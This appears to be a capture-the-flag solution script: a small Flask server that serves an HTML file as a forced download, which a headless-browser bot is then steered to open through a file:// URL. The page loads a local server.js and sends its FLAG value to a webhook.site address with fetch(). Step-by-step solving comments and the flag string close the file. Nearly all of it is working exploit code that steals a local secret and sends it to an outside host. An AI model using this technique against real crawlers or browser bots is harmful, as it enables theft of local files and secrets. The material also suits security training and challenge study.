from flask import Flask
app = Flask(__name__)

@app.route('/index.html')
def hello_world():
    r = """
    <html>
    <head>
        <script>
            function require(a){
                if(a=="express"){return ()=>{return {get:function(){},listen:function(){}}}
                }
                if(a=="redis"){
                    return {createClient:function(){}}
                }
                if(a=="fs"){
                    return {existsSync:function(){}};
                }
            }
        </script>
        <script src="/home/user/app/server.js">
        </script>
        <script>
            fetch("https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?a="+FLAG);
        </script>
    </head>
    </html>
    """

    return r,{"Content-Disposition":'attachment; filename="evil.html"'}

if(__name__=="__main__"):
    app.run("0.0.0.0",4000)
    
#How to solve:
# 1. Host this somewhere (python3 server.py)
# 2. Enter url of `index.html` to the bot, Then chrome will download file as evil.html and will save it in Downloads folder. (http://<ip>:<port>/index.html)
# 3. Then send this url of saved file to bot: "file:///home/user/Downloads/evil.html"
# 4. Flag will be sent to https://webhook.site/X (BALSN{THe_cRawLEr_Is_cAughT_IN_tHe_wOVeN_wEb})